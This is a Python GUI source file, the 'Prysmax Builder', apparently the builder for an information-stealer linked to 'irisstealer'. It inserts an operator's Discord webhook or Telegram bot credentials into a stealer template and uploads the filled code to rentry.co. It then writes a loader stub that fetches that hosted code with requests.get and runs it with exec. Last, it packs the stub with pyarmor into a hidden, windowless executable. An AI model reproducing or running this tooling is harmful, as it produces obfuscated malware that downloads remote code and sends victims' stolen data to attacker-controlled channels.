import os
import subprocess
import customtkinter as ctk
from tkinter import messagebox
import http.cookiejar
import sys
import urllib.parse
import urllib.request
from http.cookies import SimpleCookie
from json import loads as json_loads
import argparse

_headers = {"Referer": 'https://rentry.co'}

class UrllibClient:

    def __init__(self):
        self.cookie_jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookie_jar))
        urllib.request.install_opener(self.opener)

    def get(self, url, headers={}):
        request = urllib.request.Request(url, headers=headers)
        return self._request(request)

    def post(self, url, data=None, headers={}):
        postdata = urllib.parse.urlencode(data).encode()
        request = urllib.request.Request(url, postdata, headers)
        return self._request(request)

    def _request(self, request):
        response = self.opener.open(request)
        response.status_code = response.getcode()
        response.data = response.read().decode('utf-8')
        return response

def new(url, edit_code, text):
    client, cookie = UrllibClient(), SimpleCookie()

    cookie.load(vars(client.get('https://rentry.co'))['headers']['Set-Cookie'])
    csrftoken = cookie['csrftoken'].value

    payload = {
        'csrfmiddlewaretoken': csrftoken,
        'url': url,
        'edit_code': edit_code,
        'text': text
    }

    return json_loads(client.post('https://rentry.co/api/new', payload, headers=_headers).data)

def get_rentry_link(text):
    url, edit_code = '', ''

    response = new(url, edit_code, text)
    if response['status'] != '200':
        print('error: {}'.format(response['content']))
        try:
            for i in response['errors'].split('.'):
                i and print(i)
            sys.exit(1)
        except:
            sys.exit(1)
    else:
        pastebin_link = response['url']
        return pastebin_link

def install_and_import(library):
    try:
        __import__(library)
    except ImportError:
        print(f"{library} Installing...")
        subprocess.check_call(['pip', 'install', library])

# Install customtkinter if not already installed
install_and_import('customtkinter')

# Fu
# nction to download required libraries
def download_libraries():
    required_libraries = [
        'requests', 'json', 'base64', 'sqlite3', 'shutil', 'uuid', 'wmi', 'psutil',
        'subprocess', 'pyarmor==7.6.1', 'pyinstaller', 'glob', 're', 'platform', 'Pillow', 
        'zipfile', 'discord-webhook', 'pycryptodomex', 'pycryptodome', 'datetime', 'pywin32',
    ]

    for library in required_libraries:
        try:
            __import__(library)
        except ImportError:
            print(f"{library} not found. Downloading...")
            subprocess.check_call(['pip', 'install', library])

# Function to handle Telegram and Discord configuration
def compile_and_explore(webhook_url, bot_token=None, chat_id=None):
    if not os.path.exists("prysmax1builder"):
        os.makedirs("prysmax1builder")

    main_content = ""
    with open("main.py", 'r', encoding='utf-8') as main_file:
        main_content = main_file.read()

    if webhook_url:
        main_content = main_content.replace('theapi2023 = "Here-Token"', f'theapi2023 = "{webhook_url}"')
    
    if bot_token:
        main_content = main_content.replace('bot_token = "here-your-telegram"', f'bot_token = "{bot_token}"')
    
    if chat_id:
        main_content = main_content.replace('chat_id = "here-your-chat-id"', f'chat_id = "{chat_id}"')

    file_path = os.path.join("prysmax1builder", "main.py")
    with open(file_path, 'w', encoding='utf-8') as new_main_file:
        new_main_file.write(main_content)
    
    
    with open(file_path, 'r') as file:
     with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
      file_content = file.read()


     pastebin_link = get_rentry_link(file_content)
    with open(file_path, "w") as newfile:
        newfile.write(f"""
import os, requests,shutil, uuid, wmi, psutil, subprocess, glob, re
import platform as platform_module
from discord_webhook import DiscordEmbed, DiscordWebhook

from PIL import ImageGrab
from zipfile import ZipFile
import os
import re
import shutil
import random
import socket
import threading
import subprocess
import getpass
from base64 import b64decode
from json import loads, dumps
from zipfile import ZipFile, ZIP_DEFLATED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from json import *


iris = requests.get("{pastebin_link}/raw").text
exec(iris)                      
""")
    
    
    
    here = messagebox.askyesno("Confirm Compilation", "Are you sure you want to compile your file to Executable?")
    if here:
        print("Compiling...")
        try:
            subprocess.run('pyarmor pack -e"--onefile --noconsole --icon=NONE" prysmax1builder\\main.py', shell=True)
        except:
            subprocess.run('pyarmor-7 pack -e"--onefile --noconsole --icon=NONE" prysmax1builder\\main.py', shell=True)

        print("File successfully compiled!")
        subprocess.run("explorer prysmax1builder\\dist", shell=True)
    else:
        print("Compilation canceled.")

# Main interface with customtkinter
def main():
    ctk.set_appearance_mode("dark")  # Dark mode
    ctk.set_default_color_theme("blue")  # Default theme color

    def on_download_libraries():
        download_libraries()
        messagebox.showinfo("Info", "Libraries downloaded successfully!")

    def on_compile_and_explore():
        webhook_url = webhook_url_entry.get()
        bot_token = bot_token_entry.get()
        chat_id = chat_id_entry.get()
        if selected_service.get() == "Discord":
            compile_and_explore(webhook_url)
        elif selected_service.get() == "Telegram":
            compile_and_explore(None, bot_token, chat_id)
        elif selected_service.get() == "Both":
            compile_and_explore(webhook_url, bot_token, chat_id)

    root = ctk.CTk()
    root.title("Prysmax Builder")
    root.geometry("600x650")

    # Title Label
    title_label = ctk.CTkLabel(root, text="Prysmax Builder", font=ctk.CTkFont(size=26, weight="bold"))
    title_label.pack(pady=20)

    # Frame for user inputs
    frame = ctk.CTkFrame(root, corner_radius=15)
    frame.pack(pady=20, padx=20, fill="both", expand=True)

    # Webhook entry for Discord
    webhook_label = ctk.CTkLabel(frame, text="Enter your Discord Webhook URL:")
    webhook_label.pack(pady=10)
    webhook_url_entry = ctk.CTkEntry(frame, width=400, corner_radius=10)
    webhook_url_entry.pack(pady=10)

    # Telegram bot token
    bot_token_label = ctk.CTkLabel(frame, text="Enter your Telegram Bot Token:")
    bot_token_label.pack(pady=10)
    bot_token_entry = ctk.CTkEntry(frame, width=400, corner_radius=10)
    bot_token_entry.pack(pady=10)

    # Telegram chat ID
    chat_id_label = ctk.CTkLabel(frame, text="Enter your Telegram Chat ID:")
    chat_id_label.pack(pady=10)
    chat_id_entry = ctk.CTkEntry(frame, width=400, corner_radius=10)
    chat_id_entry.pack(pady=10)

    # Service selection (Telegram/Discord/Both)
    selected_service = ctk.StringVar(value="Discord")
    discord_radio = ctk.CTkRadioButton(frame, text="Discord", variable=selected_service, value="Discord", border_width_checked=2)
    discord_radio.pack(pady=5)
    telegram_radio = ctk.CTkRadioButton(frame, text="Telegram", variable=selected_service, value="Telegram", border_width_checked=2)
    telegram_radio.pack(pady=5)
    both_radio = ctk.CTkRadioButton(frame, text="Both", variable=selected_service, value="Both", border_width_checked=2)
    both_radio.pack(pady=5)

    # Buttons
    button_frame = ctk.CTkFrame(frame)
    button_frame.pack(pady=20)

    download_button = ctk.CTkButton(button_frame, text="Download Libraries", command=on_download_libraries, width=150)
    download_button.grid(row=0, column=0, padx=10, pady=10)

    compile_button = ctk.CTkButton(button_frame, text="Compile and Explore", command=on_compile_and_explore, width=150)
    compile_button.grid(row=0, column=1, padx=10, pady=10)

    # Exit button
    exit_button = ctk.CTkButton(frame, text="Exit", command=root.quit, width=200, fg_color="red")
    exit_button.pack(pady=10)

    # Footer for links and credits
    footer_frame = ctk.CTkFrame(root, corner_radius=15)
    footer_frame.pack(pady=10, fill="x")

    # Copyright and links
    copyright_label = ctk.CTkLabel(footer_frame, text="© Prysmax 2024", font=ctk.CTkFont(size=10))
    copyright_label.pack()

    telegram_label1 = ctk.CTkLabel(footer_frame, text="t.me/prysmax", font=ctk.CTkFont(size=10))
    telegram_label1.pack()

    telegram_label2 = ctk.CTkLabel(footer_frame, text="t.me/lawxsz", font=ctk.CTkFont(size=10))
    telegram_label2.pack()

    iris_label = ctk.CTkLabel(footer_frame, text="Pronto t.me/irisstealer", font=ctk.CTkFont(size=10))
    iris_label.pack()

    prysmax_label = ctk.CTkLabel(root, text="t.me/prysmax", font=ctk.CTkFont(size=12, weight="bold"), text_color="lightblue")
    prysmax_label.pack(pady=5)

    irisstealer_label = ctk.CTkLabel(root, text="t.me/irisstealer", font=ctk.CTkFont(size=12, weight="bold"), text_color="lightblue")
    irisstealer_label.pack(pady=5)

    root.mainloop()

if __name__ == '__main__':
    main()
